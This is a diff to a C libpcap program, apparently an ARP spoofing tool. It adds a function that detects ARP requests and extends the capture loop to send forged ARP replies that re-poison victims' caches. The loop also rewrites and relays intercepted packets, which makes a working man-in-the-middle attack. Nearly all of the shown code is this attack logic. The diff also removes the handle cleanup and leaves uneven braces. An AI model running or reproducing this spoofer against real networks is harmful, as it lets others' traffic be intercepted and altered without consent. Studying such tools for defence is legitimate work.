@@ -101,7 +101,6 @@ void print_mac(uint8_t* mac){
 void snd_rply (pcap_t* handle, uint8_t* snd_mac, uint8_t* snd_ip, uint8_t* tgt_mac, uint8_t* tgt_ip){
     struct arp_pckt arp_p;
 
-
     memcpy(arp_p.eth.dst_mac, tgt_mac, 6);
     memcpy(arp_p.eth.src_mac, snd_mac, 6);
     memcpy(arp_p.eth.type, "\x08\x06", 2);
@@ -116,6 +115,17 @@ void snd_rply (pcap_t* handle, uint8_t* snd_mac, uint8_t* snd_ip, uint8_t* tgt_m
     memcpy(arp_p.arp.tgt_ip, tgt_ip, 4);
 
     pcap_sendpacket(handle, (const u_char*)&arp_p, 60);
+}
+
+bool chck_arp(const u_char* packet, uint8_t* mymac){
+    int type;
+    struct eth_h eth;
+    memcpy(&eth, packet, 14);
+    type = (eth.type[0]<<8 | eth.type[1]);
+    if(type == 0x0806) {
+    if(!memcmp(eth.dst_mac, mymac, 6) || !memcmp(eth.dst_mac, "\xff\xff\xff\xff\xff\xff", 6)) return true;
+    }
+    return false;
 }
 
 
@@ -175,8 +185,19 @@ int main(int argc, char* argv[]) {
     if (res == 0) continue;
     if (res == -1 || res == -2) break;
     printf("%u bytes captured\n", header->caplen);
-  }
+    for (int i=0; i<sess_num; i++){
+               if(chck_arp(packet, sess_s[i].snd_mac)){
+                   snd_rply(handle, my_mac, sess_s[i].tgt_ip, sess_s[i].snd_mac, sess_s[i].snd_ip);
+                   continue;
+               }
+       }
 
-  pcap_close(handle);
+           for (int i=0; i<sess_num; i++){
+               if(chck_snd_to_tgt(packet, sess_s[i])){
+                   rnd_pckt(packet, my_mac, sess_s[i]);
+               pcap_sendpacket(handle, packet, header->caplen);
+               }
+           }
+       }
   return 0;
 }
